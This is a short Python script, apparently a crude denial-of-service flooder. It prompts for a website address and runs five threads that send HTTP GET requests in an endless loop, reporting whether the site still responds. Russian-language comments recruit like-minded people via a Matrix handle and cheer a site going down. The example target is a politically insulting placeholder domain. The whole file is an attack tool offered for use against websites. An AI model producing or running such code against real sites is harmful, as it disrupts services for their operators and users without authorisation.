#!/usr/bin/env python3

import threading
import requests
import os

#я буду вводить изменения, если вы хотите стать моим единомышлинником то пишите мне в element
# @elliotanderson1337:matrix.org


os.system("clear")
print("если программа не запускает атаку, а просто ожидает то сайт недоступен а это значит что очень хорошо")
print("PRIMER http://putin.xui")
input_user = input("[-] VVEDI ADDRESS CAITA >> ")

def main():
	while True:
		global input_user
		req = requests.get(input_user)
		if req.status_code == 200:
			print("[+] RABOTAET")

		else:
			print("[!] CAIT NE RABOTAET| NOT WORKING ")

if __name__ == "__main__":
	try:
		for i in range(5):
			thread = threading.Thread(target=main)
			thread.start()

	except KeyboardInterrupt:
		os.system("clear")
